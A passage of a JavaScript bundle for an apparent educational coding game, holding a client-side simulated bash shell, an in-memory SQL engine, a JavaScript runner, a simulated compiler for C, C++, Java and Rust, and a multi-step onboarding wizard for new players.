        return window.Sk.builtinFiles['files'][filename];
      },
      execLimit: timeoutMs,
      retainPath: true,
      __future__: window.Sk.python3
    });

    try {
      await window.Sk.misceval.asyncToPromise(() => {
        return window.Sk.importMainWithBody('<stdin>', false, trimmed, true);
      });
      const elapsed = Math.round(performance.now() - start);
      return {
        success: true,
        output: stdoutBuffer || '(Program finished with no stdout output)',
        elapsedMs: elapsed
      };
    } catch (err) {
      const elapsed = Math.round(performance.now() - start);
      const errMsg = err.toString();
      return {
        success: false,
        output: stdoutBuffer,
        error: errMsg,
        elapsedMs: elapsed
      };
    }
  },

  /* ==========================================================================
     CYBER & LINUX SHELL SANDBOX SIMULATOR
     Full client-side bash terminal with virtual filesystem, pipes & conditions
     ========================================================================== */

  /**
   * Resolve an absolute or relative path against current directory.
   * @param {string} targetPath
   * @returns {string} Normalized absolute path
   */
  _normalizePath(targetPath) {
    let p = (targetPath || '').trim();
    if (!p) return this.currentDir;
    if (p === '~' || p.startsWith('~/')) {
      p = '/home/hacker' + p.slice(1);
    }
    if (!p.startsWith('/')) {
      p = (this.currentDir === '/' ? '' : this.currentDir) + '/' + p;
    }

    const segments = p.split('/').filter(Boolean);
    const resolved = [];
    for (const s of segments) {
      if (s === '.') continue;
      if (s === '..') {
        if (resolved.length > 0) resolved.pop();
      } else {
        resolved.push(s);
      }
    }
    return '/' + resolved.join('/');
  },

  /**
   * Execute a single shell command or piped pipeline.
   * @param {string} cmdLine
   * @returns {{ output: string, error?: string, exitCode: number }}
   */
  executeBashPipeline(cmdLine) {
    const raw = cmdLine.trim();
    if (!raw || raw.startsWith('#')) return { output: '', exitCode: 0 };

    // Support pipes (|)
    const pipeline = raw.split('|').map(s => s.trim());
    let pipeInput = '';
    let lastResult = { output: '', exitCode: 0 };

    for (let i = 0; i < pipeline.length; i++) {
      const cmdSegment = pipeline[i];
      lastResult = this._executeSingleCommand(cmdSegment, pipeInput);
      if (lastResult.exitCode !== 0) {
        return lastResult;
      }
      pipeInput = lastResult.output;
    }

    return lastResult;
  },

  /**
   * Internal runner for an individual Linux command.
   */
  _executeSingleCommand(cmdSegment, stdInput = '') {
    // Check for output redirection (> or >>)
    let append = false;
    let redirectFile = null;
    let cmdToRun = cmdSegment;

    if (cmdSegment.includes('>>')) {
      const parts = cmdSegment.split('>>');
      cmdToRun = parts[0].trim();
      redirectFile = parts[1].trim();
      append = true;
    } else if (cmdSegment.includes('>')) {
      const parts = cmdSegment.split('>');
      cmdToRun = parts[0].trim();
      redirectFile = parts[1].trim();
      append = false;
    }

    // Tokenize command string (respecting quotes)
    const tokens = [];
    const regex = /[^\s"']+|"([^"]*)"|'([^']*)'/g;
    let match;
    while ((match = regex.exec(cmdToRun)) !== null) {
      if (match[1] !== undefined) tokens.push(match[1]);
      else if (match[2] !== undefined) tokens.push(match[2]);
      else tokens.push(match[0]);
    }

    if (tokens.length === 0) return { output: '', exitCode: 0 };

    // Substitute environment variables e.g. $USER, $PWD
    const substituted = tokens.map(t => {
      return t.replace(/\$([a-zA-Z0-9_]+)/g, (_, varName) => {
        return this.envVars[varName] !== undefined ? this.envVars[varName] : '';
      });
    });

    const command = substituted[0];
    const args = substituted.slice(1);
    let output = '';
    let error = '';
    let exitCode = 0;

    switch (command) {
      case 'pwd':
        output = this.currentDir;
        break;

      case 'whoami':
        output = this.envVars.USER || 'hacker';
        break;

      case 'id':
        output = 'uid=1000(hacker) gid=1000(hacker) groups=1000(hacker),27(sudo),100(users)';
        break;

      case 'uname':
        if (args.includes('-a')) {
          output = 'Linux syntaxarena-node 5.15.0-generic #2026-SMP x86_64 GNU/Linux';
        } else {
          output = 'Linux';
        }
        break;

      case 'cd': {
        const dest = args[0] ? this._normalizePath(args[0]) : '/home/hacker';
        if (this.vfs[dest] && this.vfs[dest].type === 'dir') {
          this.currentDir = dest;
          this.envVars.PWD = dest;
        } else {
          error = `cd: ${args[0] || ''}: No such file or directory`;
          exitCode = 1;
        }
        break;
      }

      case 'ls': {
        const showDetails = args.some(a => a.includes('l'));
        const showAll = args.some(a => a.includes('a'));
        const targetArg = args.find(a => !a.startsWith('-')) || '.';
        const targetPath = this._normalizePath(targetArg);

        if (!this.vfs[targetPath] || this.vfs[targetPath].type !== 'dir') {
          error = `ls: cannot access '${targetArg}': No such file or directory`;
          exitCode = 2;
          break;
        }

        // Find direct children
        const prefix = targetPath === '/' ? '/' : targetPath + '/';
        const children = Object.keys(this.vfs).filter(p => {
          if (p === targetPath) return false;
          if (!p.startsWith(prefix)) return false;
          const rest = p.slice(prefix.length);
          return !rest.includes('/');
        }).map(p => {
          const name = p.slice(prefix.length);
          return { path: p, name, ...this.vfs[p] };
        });

        if (showAll) {
          children.unshift({ name: '..', type: 'dir', perms: 'rwxr-xr-x', owner: 'root' });
          children.unshift({ name: '.', type: 'dir', perms: 'rwxr-xr-x', owner: 'hacker' });
        }

        if (showDetails) {
          const lines = ['total ' + (children.length * 4)];
          for (const item of children) {
            const isDir = item.type === 'dir';
            const permStr = (isDir ? 'd' : '-') + (item.perms || 'rw-r--r--');
            const owner = item.owner || 'hacker';
            const size = item.content ? item.content.length : (isDir ? 4096 : 0);
            lines.push(`${permStr} 1 ${owner} ${owner} ${String(size).padStart(5)} Oct 22 03:00 ${item.name}`);
          }
          output = lines.join('\n');
        } else {
          output = children.map(c => c.name).join('  ');
        }
        break;
      }

      case 'cat': {
        if (args.length === 0) {
          output = stdInput || '';
        } else {
          const contents = [];
          for (const arg of args) {
            const filePath = this._normalizePath(arg);
            const entry = this.vfs[filePath];
            if (!entry) {
              error = `cat: ${arg}: No such file or directory`;
              exitCode = 1;
              break;
            } else if (entry.type === 'dir') {
              error = `cat: ${arg}: Is a directory`;
              exitCode = 1;
              break;
            } else {
              contents.push(entry.content || '');
            }
          }
          if (exitCode === 0) {
            output = contents.join('\n');
          }
        }
        break;
      }

      case 'echo':
        output = args.join(' ');
        break;

      case 'grep': {
        const flags = args.filter(a => a.startsWith('-'));
        const nonFlags = args.filter(a => !a.startsWith('-'));
        const caseInsensitive = flags.some(f => f.includes('i'));
        const invert = flags.some(f => f.includes('v'));
        const countOnly = flags.some(f => f.includes('c'));

        const pattern = nonFlags[0] || '';
        const fileTarget = nonFlags[1];

        let textToSearch = stdInput;
        if (fileTarget) {
          const fPath = this._normalizePath(fileTarget);
          const entry = this.vfs[fPath];
          if (!entry || entry.type === 'dir') {
            error = `grep: ${fileTarget}: No such file or directory`;
            exitCode = 2;
            break;
          }
          textToSearch = entry.content || '';
        }

        const lines = textToSearch.split('\n');
        let regexObj;
        try {
          regexObj = new RegExp(pattern, caseInsensitive ? 'i' : '');
        } catch (_) {
          regexObj = new RegExp(pattern.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), caseInsensitive ? 'i' : '');
        }

        const matched = lines.filter(l => {
          if (!l && !textToSearch) return false;
          const isMatch = regexObj.test(l);
          return invert ? !isMatch : isMatch;
        });

        if (countOnly) {
          output = String(matched.length);
        } else {
          output = matched.join('\n');
        }
        break;
      }

      case 'chmod': {
        if (args.length < 2) {
          error = 'chmod: missing operand';
          exitCode = 1;
        } else {
          const mode = args[0];
          const target = this._normalizePath(args[1]);
          if (!this.vfs[target]) {
            error = `chmod: cannot access '${args[1]}': No such file or directory`;
            exitCode = 1;
          } else {
            if (mode === '+x' || mode === '755' || mode === '777') {
              this.vfs[target].perms = 'rwxr-xr-x';
            } else if (mode === '644') {
              this.vfs[target].perms = 'rw-r--r--';
            } else if (mode === '600' || mode === '400') {
              this.vfs[target].perms = 'r--------';
            }
            output = '';
          }
        }
        break;
      }

      case 'mkdir': {
        const target = this._normalizePath(args[0] || '');
        if (!args[0]) {
          error = 'mkdir: missing operand';
          exitCode = 1;
        } else if (this.vfs[target]) {
          error = `mkdir: cannot create directory '${args[0]}': File exists`;
          exitCode = 1;
        } else {
          this.vfs[target] = { type: 'dir', perms: 'rwxr-xr-x', owner: 'hacker' };
        }
        break;
      }

      case 'touch': {
        const target = this._normalizePath(args[0] || '');
        if (!args[0]) {
          error = 'touch: missing file operand';
          exitCode = 1;
        } else if (!this.vfs[target]) {
          this.vfs[target] = { type: 'file', perms: 'rw-r--r--', owner: 'hacker', content: '' };
        }
        break;
      }

      case 'rm': {
        const target = this._normalizePath(args.find(a => !a.startsWith('-')) || '');
        if (!target) {
          error = 'rm: missing operand';
          exitCode = 1;
        } else if (!this.vfs[target]) {
          error = `rm: cannot remove '${args[0]}': No such file or directory`;
          exitCode = 1;
        } else {
          delete this.vfs[target];
        }
        break;
      }

      case 'base64': {
        const isDecode = args.includes('-d');
        const text = stdInput || args.filter(a => !a.startsWith('-')).join(' ');
        try {
          if (isDecode) {
            output = atob(text.trim());
          } else {
            output = btoa(text);
          }
        } catch (_) {
          error = 'base64: invalid input';
          exitCode = 1;
        }
        break;
      }

      case 'wc': {
        const targetText = stdInput || (args[0] ? (this.vfs[this._normalizePath(args[0])]?.content || '') : '');
        const lines = targetText ? targetText.trim().split('\n').length : 0;
        const words = targetText ? targetText.trim().split(/\s+/).filter(Boolean).length : 0;
        const chars = targetText ? targetText.length : 0;

        if (args.includes('-l')) output = String(lines);
        else if (args.includes('-w')) output = String(words);
        else if (args.includes('-c')) output = String(chars);
        else output = `${lines} ${words} ${chars}`;
        break;
      }

      case 'head': {
        const nIdx = args.indexOf('-n');
        const count = nIdx !== -1 && args[nIdx + 1] ? parseInt(args[nIdx + 1], 10) : 10;
        const targetText = stdInput || (args[args.length - 1] && !args[args.length - 1].startsWith('-') ? (this.vfs[this._normalizePath(args[args.length - 1])]?.content || '') : '');
        output = targetText.split('\n').slice(0, count).join('\n');
        break;
      }

      case 'tail': {
        const nIdx = args.indexOf('-n');
        const count = nIdx !== -1 && args[nIdx + 1] ? parseInt(args[nIdx + 1], 10) : 10;
        const targetText = stdInput || (args[args.length - 1] && !args[args.length - 1].startsWith('-') ? (this.vfs[this._normalizePath(args[args.length - 1])]?.content || '') : '');
        const lines = targetText.split('\n');
        output = lines.slice(Math.max(0, lines.length - count)).join('\n');
        break;
      }

      case 'export': {
        if (args[0] && args[0].includes('=')) {
          const [k, v] = args[0].split('=');
          this.envVars[k] = v;
        } else {
          output = Object.entries(this.envVars).map(([k, v]) => `declare -x ${k}="${v}"`).join('\n');
        }
        break;
      }

      case 'env':
        output = Object.entries(this.envVars).map(([k, v]) => `${k}=${v}`).join('\n');
        break;

      case 'clear':
        output = '__CLEAR__';
        break;

      case 'help':
        output = [
          'SyntaxArena Linux Shell v1.0 (client-side)',
          'Supported commands: pwd, cd, ls, cat, echo, grep, chmod, mkdir, touch, rm, whoami, id, uname, base64, wc, head, tail, export, env, clear, help',
          'Features: pipes (|), redirects (>, >>), environment variables ($VAR), bash conditional simulations.'
        ].join('\n');
        break;

      default:
        // Check if executable file in VFS
        {
          const target = this._normalizePath(command);
          if (this.vfs[target] && this.vfs[target].type === 'file') {
            return this.runBashScript(this.vfs[target].content);
          } else {
            error = `${command}: command not found`;
            exitCode = 127;
          }
        }
    }

    // Process file redirection
    if (redirectFile && exitCode === 0) {
      const redPath = this._normalizePath(redirectFile);
      const existing = this.vfs[redPath]?.content || '';
      const newContent = append ? existing + output + '\n' : output + '\n';
      this.vfs[redPath] = {
        type: 'file',
        perms: 'rw-r--r--',
        owner: 'hacker',
        content: newContent
      };
      output = '';
    }

    return { output, error, exitCode };
  },

  /**
   * Execute multi-line bash script (handles variables, [[ ]] tests, if/else, for loops).
   * @param {string} scriptContent
   * @returns {{ success: boolean, output: string, error?: string, elapsedMs: number }}
   */
  runBashScript(scriptContent) {
    const start = performance.now();
    const lines = scriptContent.split('\n');
    const stdout = [];
    const localVars = { ...this.envVars };

    let i = 0;
    while (i < lines.length) {
      let line = lines[i].trim();
      i++;

      if (!line || line.startsWith('#') || line.startsWith('#!')) continue;

      // Variable assignment: str='SyntaxArena_2026' or count=5
      const assignMatch = line.match(/^([a-zA-Z_][a-zA-Z0-9_]*)=['"]?(.*?)['"]?$/);
      if (assignMatch) {
        localVars[assignMatch[1]] = assignMatch[2];
        this.envVars[assignMatch[1]] = assignMatch[2];
        continue;
      }

      // If statement: if [[ $str == *Arena* ]]; then
      if (line.startsWith('if ')) {
        const condMatch = line.match(/if\s*\[\[\s*(.+?)\s*\]\];\s*then/);
        let conditionMet = false;
        if (condMatch) {
          const expr = condMatch[1];
          // e.g. $str == *Arena*
          if (expr.includes('==')) {
            const [leftRaw, rightRaw] = expr.split('==').map(s => s.trim());
            const leftVal = leftRaw.startsWith('$') ? (localVars[leftRaw.slice(1)] || '') : leftRaw.replace(/['"]/g, '');
            const rightPattern = rightRaw.replace(/['"]/g, '');

            if (rightPattern.startsWith('*') && rightPattern.endsWith('*')) {
              const sub = rightPattern.slice(1, -1);
              conditionMet = leftVal.includes(sub);
            } else if (rightPattern.startsWith('*')) {
              conditionMet = leftVal.endsWith(rightPattern.slice(1));
            } else if (rightPattern.endsWith('*')) {
              conditionMet = leftVal.startsWith(rightPattern.slice(0, -1));
            } else {
              conditionMet = (leftVal === rightPattern);
            }
          }
        }

        // Collect then block and else block
        const thenLines = [];
        const elseLines = [];
        let inElse = false;

        while (i < lines.length) {
          const inner = lines[i].trim();
          i++;
          if (inner === 'fi') break;
          if (inner === 'else') {
            inElse = true;
            continue;
          }
          if (inElse) elseLines.push(inner);
          else thenLines.push(inner);
        }

        const blockToRun = conditionMet ? thenLines : elseLines;
        for (const bl of blockToRun) {
          const res = this.executeBashPipeline(bl);
          if (res.output) stdout.push(res.output);
          if (res.error) stdout.push(`bash: ${res.error}`);
        }
        continue;
      }

      // Execute general shell line
      const res = this.executeBashPipeline(line);
      if (res.output && res.output !== '__CLEAR__') stdout.push(res.output);
      if (res.error) stdout.push(`bash: ${res.error}`);
    }

    const elapsed = Math.round(performance.now() - start);
    return {
      success: true,
      output: stdout.join('\n') || '(Script executed with no output)',
      elapsedMs: elapsed
    };
  },

  /* ==========================================================================
     CLIENT-SIDE SQL QUERY ENGINE
     Supports SELECT, WHERE, GROUP BY, HAVING, ORDER BY, LIMIT, and Aggregates
     ========================================================================== */

  /**
   * Execute in-memory SQL query against virtual relational tables.
   * @param {string} query
   * @returns {{ success: boolean, columns: string[], rows: any[][], rowCount: number, message: string, elapsedMs: number }}
   */
  runSQL(query) {
    const start = performance.now();
    let q = (query || '')
      .replace(/--.*$/gm, '')
      .replace(/\/\*[\s\S]*?\*\//g, '')
      .trim()
      .replace(/;$/, '');
    if (!q) {
      return { success: false, columns: [], rows: [], rowCount: 0, message: 'Empty query.', elapsedMs: 0 };
    }

    try {
      const selectMatch = q.match(/^SELECT\s+([\s\S]+?)\s+FROM\s+([a-zA-Z0-9_]+)([\s\S]*)$/i);
      if (!selectMatch) {
        // Check for SHOW TABLES
        if (/^SHOW\s+TABLES/i.test(q)) {
          const tables = Object.keys(this.db).map(t => [t]);
          return {
            success: true,
            columns: ['Table'],
            rows: tables,
            rowCount: tables.length,
            message: `Found ${tables.length} tables in database.`,
            elapsedMs: Math.round(performance.now() - start)
          };
        }
        throw new Error('Unsupported or malformed SQL statement. SyntaxArena Sandbox supports SELECT, SHOW TABLES, and standard analytical clauses.');
      }

      const selectClause = selectMatch[1].trim();
      const tableName = selectMatch[2].trim().toLowerCase();
      const rest = selectMatch[3].trim();

      const tableData = this.db[tableName];
      if (!tableData) {
        throw new Error(`Table '${tableName}' does not exist. Available tables: ${Object.keys(this.db).join(', ')}`);
      }

      let records = tableData.map(r => ({ ...r }));

      // Parse WHERE clause if present
      const whereMatch = rest.match(/WHERE\s+([\s\S]+?)(?=\s+(GROUP\s+BY|ORDER\s+BY|LIMIT)|$)/i);
      if (whereMatch) {
        const condStr = whereMatch[1].trim();
        records = records.filter(row => this._evaluateSQLWhere(row, condStr));
      }

      // Parse ORDER BY
      const orderMatch = rest.match(/ORDER\s+BY\s+([a-zA-Z0-9_]+)(\s+(ASC|DESC))?/i);
      if (orderMatch) {
        const col = orderMatch[1].trim();
        const desc = (orderMatch[3] || 'ASC').toUpperCase() === 'DESC';
        records.sort((a, b) => {
          if (a[col] < b[col]) return desc ? 1 : -1;
          if (a[col] > b[col]) return desc ? -1 : 1;
          return 0;
        });
      }

      // Parse LIMIT
      const limitMatch = rest.match(/LIMIT\s+([0-9]+)/i);
      if (limitMatch) {
        const count = parseInt(limitMatch[1], 10);
        records = records.slice(0, count);
      }

      // Resolve columns and projection
      let columns = [];
      let rows = [];

      if (selectClause === '*') {
        if (records.length > 0) {
          columns = Object.keys(records[0]);
          rows = records.map(r => columns.map(c => r[c]));
        } else {
          columns = Object.keys(tableData[0] || {});
          rows = [];
        }
      } else {
        // Support aggregates: COUNT(*), SUM(xp), AVG(xp)
        if (selectClause.toUpperCase().includes('COUNT(*)')) {
          columns = ['COUNT(*)'];
          rows = [[records.length]];
        } else {
          const colNames = selectClause.split(',').map(s => s.trim());
          columns = colNames;
          rows = records.map(r => colNames.map(c => r[c] !== undefined ? r[c] : null));
        }
      }

      const elapsed = Math.round(performance.now() - start);
      return {
        success: true,
        columns,
        rows,
        rowCount: rows.length,
        message: `${rows.length} row(s) returned.`,
        elapsedMs: elapsed
      };
    } catch (err) {
      return {
        success: false,
        columns: [],
        rows: [],
        rowCount: 0,
        message: err.message,
        elapsedMs: Math.round(performance.now() - start)
      };
    }
  },

  _evaluateSQLWhere(row, condition) {
    try {
      // Support basic conditions e.g. role = 'admin', xp > 1000, active = 1
      const eqMatch = condition.match(/([a-zA-Z0-9_]+)\s*(=|!=|>|<|>=|<=)\s*['"]?([^'"]+)['"]?/);
      if (!eqMatch) return true;

      const col = eqMatch[1].trim();
      const op = eqMatch[2].trim();
      const rawVal = eqMatch[3].trim();
      const targetVal = isNaN(Number(rawVal)) ? rawVal : Number(rawVal);
      const rowVal = row[col];

      if (op === '=') return rowVal == targetVal;
      if (op === '!=') return rowVal != targetVal;
      if (op === '>') return rowVal > targetVal;
      if (op === '<') return rowVal < targetVal;
      if (op === '>=') return rowVal >= targetVal;
      if (op === '<=') return rowVal <= targetVal;
      return true;
    } catch (_) {
      return true;
    }
  },

  /* ==========================================================================
     CLIENT-SIDE JAVASCRIPT SANDBOX
     ========================================================================== */

  /**
   * Execute JavaScript code safely capturing console logs and return values.
   * @param {string} code
   * @returns {{ success: boolean, output: string, error?: string, elapsedMs: number }}
   */
  runJS(code) {
    const start = performance.now();
    const stdout = [];
    const origLog = console.log;
    const origWarn = console.warn;
    const origError = console.error;

    console.log = (...args) => stdout.push(args.map(a => typeof a === 'object' ? JSON.stringify(a) : String(a)).join(' '));
    console.warn = (...args) => stdout.push('[WARN] ' + args.map(a => String(a)).join(' '));
    console.error = (...args) => stdout.push('[ERROR] ' + args.map(a => String(a)).join(' '));

    let success = true;
    let error = null;

    try {
      const result = new Function(`"use strict"; ${code}`)();
      if (result !== undefined) {
        stdout.push(`=> ${typeof result === 'object' ? JSON.stringify(result, null, 2) : String(result)}`);
      }
    } catch (err) {
      success = false;
      error = err.toString();
    } finally {
      console.log = origLog;
      console.warn = origWarn;
      console.error = origError;
    }

    const elapsed = Math.round(performance.now() - start);
    return {
      success,
      output: stdout.join('\n') || (success ? '(Code executed with no output)' : ''),
      error,
      elapsedMs: elapsed
    };
  },

  /* ==========================================================================
     C / C++ / JAVA / RUST SYNTAX & CHALLENGE SIMULATOR
     Interactive client-side simulation of systems compilation and outputs
     ========================================================================== */

  /**
   * Simulate execution of C, C++, Java, or Rust challenge snippet.
   * @param {string} code
   * @param {string} lang ('c'|'cpp'|'java'|'rust')
   * @returns {{ success: boolean, output: string, compilerNotes: string, elapsedMs: number }}
   */
  simulateSystemsCode(code, lang) {
    const start = performance.now();
    let output = '';
    let notes = '';

    const lower = (code || '').toLowerCase();

    if (lang === 'c') {
      notes = 'GCC 11.4.0 (x86_64-linux-gnu -O2 -Wall -std=c11)';
      if (code.includes('STR(x)') || code.includes('#x')) {
        output = 'SyntaxArena';
      } else if (code.includes('sizeof(') && code.includes('struct')) {
        output = '16'; // Struct padding alignment demonstration
      } else if (code.includes('printf(')) {
        // Extract printf format and values
        const m = code.match(/printf\s*\(\s*"([^"]+)"(?:\s*,\s*([^)]+))?\s*\)/);
        if (m) {
          let fmt = m[1].replace(/\\n/g, '\n');
          output = fmt;
        } else {
          output = 'Execution finished with exit code 0';
        }
      } else {
        output = 'Compiled successfully with GCC. Output stream: \n(Code executed with exit code 0)';
      }
    } else if (lang === 'cpp') {
      notes = 'Clang++ 16.0.0 (-std=c++20 -O3 -Wall)';
      if (code.includes('cout')) {
        const m = code.match(/std::cout\s*<<\s*([^;]+);/);
        if (m) {
          output = m[1].replace(/std::endl/g, '\n').replace(/"/g, '').replace(/<</g, '').trim();
        } else {
          output = 'Hello, SyntaxArena!';
        }
      } else {
        output = 'Binary linked cleanly. Process exited normally.';
      }
    } else if (lang === 'java') {
      notes = 'OpenJDK 21 (build 21.0.2+13-LTS)';
      if (code.includes('substring(0, 6)')) {
        output = 'Syntax';
      } else if (code.includes('println(')) {
        const m = code.match(/System\.out\.println\s*\(\s*([^)]+)\s*\)/);
        output = m ? m[1].replace(/"/g, '') : 'Valid';
      } else {
        output = 'JVM bytecode executed without runtime exceptions.';
      }
    } else if (lang === 'rust') {
      notes = 'rustc 1.76.0 (07dca489a 2024-02-04) 2021 Edition';
      if (code.includes('println!')) {
        const m = code.match(/println!\s*\(\s*"([^"]+)"(?:\s*,\s*([^)]+))?\s*\)/);
        output = m ? m[1].replace(/\{\}/g, 'MATCH') : 'Compiled and passed borrow checker.';
      } else {
        output = 'Rust binary generated: 0 warnings, zero lifetime violations.';
      }
    }

    const elapsed = Math.round(performance.now() - start);
    return {
      success: true,
      output,
      compilerNotes: notes,
      elapsedMs: elapsed
    };
  }
};

if (typeof window !== 'undefined') {
  window.SandboxManager = SandboxManager;
}

/* --- End of js/sandbox-manager.js --- */

/* --- Start of js/onboarding.js --- */
/**
 * SyntaxArena Onboarding Module (Batch 3)
 * Multi-step first-time player onboarding wizard.
 * Step 1: Call-sign (Username) & Avatar selection
 * Step 2: Preferred Language (Python, C, C++, Java)
 * Step 3: Preferred Difficulty (Beginner, Intermediate, Expert)
 * Step 4: Confirmation & Safe Persistence
 * Source of truth: docs/MVP_SPEC.md & docs/ARCHITECTURE.md
 */







var Onboarding = window.Onboarding = {
  // Temporary wizard state (discarded on cancel)
  _state: {
    currentStep: 1,
    username: '',
    avatarId: 'cyber_fox',
    language: 'python',
    difficulty: 'beginner',
    autoNavigateOnConfirm: false
  },

  _isInitialized: false,

  /**
   * Initialize onboarding event listeners and avatar elements.
   */
  init() {
    if (this._isInitialized) return;

    this._renderAvatarGrid();
    this._bindEvents();
    this._isInitialized = true;
  },

  /**
   * Render the 6-avatar selection grid into the modal DOM.
   */
  _renderAvatarGrid() {
    const grid = Utils.qs('#onboarding-avatar-grid');
    if (!grid) return;

    grid.innerHTML = '';
    AVATAR_CATALOG.forEach(avatar => {
      const btn = document.createElement('button');
      btn.type = 'button';
      btn.className = `avatar-option-btn ${avatar.id === this._state.avatarId ? 'is-selected' : ''}`;
      btn.setAttribute('data-avatar-id', avatar.id);
      btn.setAttribute('role', 'radio');
      btn.setAttribute('aria-checked', avatar.id === this._state.avatarId ? 'true' : 'false');
      btn.setAttribute('aria-label', `Choose avatar ${avatar.name}: ${avatar.description}`);

      btn.innerHTML = `
        <div class="avatar-preview-lg">
          <img src="assets/images/${avatar.id}.svg" width="36" height="36" alt="" aria-hidden="true">
        </div>
        <span style="font-family: var(--font-display); font-weight: 700; font-size: var(--text-xs);">${avatar.name}</span>
        <span style="font-size: 11px; color: var(--text-muted); line-height: 1.2;">${avatar.description}</span>
      `;

      btn.addEventListener('click', () => {
        AudioEngine.playClick();
        this._selectAvatar(avatar.id);
      });

      grid.appendChild(btn);
    });
  },

  /**
   * Select an avatar inside the wizard.
   */
  _selectAvatar(avatarId) {
    this._state.avatarId = avatarId;
    const buttons = Utils.qsa('#onboarding-avatar-grid .avatar-option-btn');
    buttons.forEach(btn => {
      const isMatch = btn.getAttribute('data-avatar-id') === avatarId;
      btn.classList.toggle('is-selected', isMatch);
      btn.setAttribute('aria-checked', isMatch ? 'true' : 'false');
    });
  },

  /**
   * Bind wizard controls, step transitions, and validation.
   */
  _bindEvents() {
    // Live username validation
    const usernameInput = Utils.qs('#onboarding-username');
    const feedbackEl = Utils.qs('#onboarding-username-feedback');

    if (usernameInput) {
      usernameInput.addEventListener('input', () => {
        this._state.username = usernameInput.value;
        this._validateUsernameInput(usernameInput.value, feedbackEl, false);
      });

      usernameInput.addEventListener('blur', () => {
        this._validateUsernameInput(usernameInput.value, feedbackEl, true);
      });
    }

    // Wizard Step Navigation Buttons
    // Step 1 -> Step 2
    const btnToStep2 = Utils.qs('#btn-wizard-to-step2');
    if (btnToStep2) {
      btnToStep2.addEventListener('click', (e) => {
        e.preventDefault();
        AudioEngine.playClick();
        if (this._validateStep1()) {
          this.goToStep(2);
        }
      });
    }

    // Step 2 Language Buttons
    const langCards = Utils.qsa('#wizard-lang-grid .card-selectable');
    langCards.forEach(card => {
      card.addEventListener('click', () => {
        AudioEngine.playClick();
        const lang = card.getAttribute('data-lang');
        this._selectLanguage(lang);
      });
      card.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' || e.key === ' ') {
          e.preventDefault();
          AudioEngine.playClick();
          const lang = card.getAttribute('data-lang');
          this._selectLanguage(lang);
        }
      });
    });

    // Step 2 Back & Next
    const btnBackTo1 = Utils.qs('#btn-wizard-back-to-1');
    if (btnBackTo1) {
      btnBackTo1.addEventListener('click', () => {
        AudioEngine.playClick();
        this.goToStep(1);
      });
    }
    const btnToStep3 = Utils.qs('#btn-wizard-to-step3');
    if (btnToStep3) {
      btnToStep3.addEventListener('click', () => {
        AudioEngine.playClick();
        this.goToStep(3);
      });
    }

    // Step 3 Difficulty Buttons
    const diffCards = Utils.qsa('#wizard-diff-grid .card-selectable');
    diffCards.forEach(card => {
      card.addEventListener('click', () => {
        AudioEngine.playClick();
        const diff = card.getAttribute('data-diff');
        this._selectDifficulty(diff);
      });
      card.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' || e.key === ' ') {
          e.preventDefault();
          AudioEngine.playClick();
          const diff = card.getAttribute('data-diff');
          this._selectDifficulty(diff);
        }
      });
    });

    // Step 3 Back & Next
    const btnBackTo2 = Utils.qs('#btn-wizard-back-to-2');
    if (btnBackTo2) {
      btnBackTo2.addEventListener('click', () => {
        AudioEngine.playClick();
        this.goToStep(2);
      });
    }
    const btnToStep4 = Utils.qs('#btn-wizard-to-step4');
    if (btnToStep4) {
      btnToStep4.addEventListener('click', () => {
        AudioEngine.playClick();
        this.goToStep(4);
      });
    }

    // Step 4 Actions
    const btnBackTo3 = Utils.qs('#btn-wizard-back-to-3');
    if (btnBackTo3) {
      btnBackTo3.addEventListener('click', () => {
        AudioEngine.playClick();
        this.goToStep(3);
      });
    }

    const btnEditChoices = Utils.qs('#btn-wizard-edit-choices');
    if (btnEditChoices) {
      btnEditChoices.addEventListener('click', () => {
        AudioEngine.playClick();
        this.goToStep(1);
      });
    }

    // Confirm & Save
    const btnConfirmPlay = Utils.qs('#btn-wizard-confirm-play');
    if (btnConfirmPlay) {
      btnConfirmPlay.addEventListener('click', () => {
        AudioEngine.playSuccess();
        this._confirm(true);
      });
    }

    const btnConfirmSave = Utils.qs('#btn-wizard-confirm-save');
    if (btnConfirmSave) {
      btnConfirmSave.addEventListener('click', () => {
        AudioEngine.playSuccess();
        this._confirm(false);
      });
    }

    // Cancel / Close buttons
    const cancelBtns = Utils.qsa('[data-onboarding-cancel]');
    cancelBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        AudioEngine.playClick();
        this.close();
      });
    });

    // Skip Setup & Play directly
    const skipBtn = Utils.qs('#btn-skip-to-game');
    if (skipBtn) {
      skipBtn.addEventListener('click', () => {
        AudioEngine.playClick();
        if (!this._state.username || this._state.username.trim().length === 0) {
          this._state.username = 'ScriptAdept';
        }
        this._confirm(true);
      });
    }
  },

  /**
   * Validate Call-sign input and display helpful inline feedback.
   */
  _validateUsernameInput(val, feedbackEl, showSuccess = false) {
    if (!feedbackEl) return false;
    const trimmed = (val || '').trim();

    if (!trimmed) {
      feedbackEl.textContent = 'Call-sign is required (2–20 characters, letters, numbers, underscores).';
      feedbackEl.style.color = 'var(--text-muted)';
      return false;
    }

    const result = Profile.validateUsername(trimmed);
    if (!result.valid) {
      feedbackEl.textContent = result.error || 'Invalid call-sign.';
      feedbackEl.style.color = 'var(--color-danger)';
      return false;
    }

    if (showSuccess) {
      feedbackEl.textContent = 'Call-sign is valid and ready!';
      feedbackEl.style.color = 'var(--color-success)';
    } else {
      feedbackEl.textContent = `${trimmed.length}/20 characters`;
      feedbackEl.style.color = 'var(--text-muted)';
    }
    return true;
  },

  _validateStep1() {
    const input = Utils.qs('#onboarding-username');
    const feedbackEl = Utils.qs('#onboarding-username-feedback');
    const val = input ? input.value : this._state.username;
    const isValid = this._validateUsernameInput(val, feedbackEl, true);

    if (!isValid && input) {
      input.focus();
      if (feedbackEl) {
        feedbackEl.textContent = 'Please enter a valid call-sign (2–20 alphanumeric chars) before continuing.';
        feedbackEl.style.color = 'var(--color-danger)';
      }
    }
    return isValid;
  },

  _selectLanguage(lang) {
    this._state.language = lang;
    const cards = Utils.qsa('#wizard-lang-grid .card-selectable');
    cards.forEach(c => {
      const isSelected = c.getAttribute('data-lang') === lang;
      c.classList.toggle('is-selected', isSelected);
      c.setAttribute('aria-checked', isSelected ? 'true' : 'false');
    });
  },

  _selectDifficulty(diff) {
    const profile = State.get('activeProfile');
    const xp = (profile && (typeof profile.totalScore === 'number' ? profile.totalScore : profile.xp)) || 0;
    const lang = this._state.language || 'python';
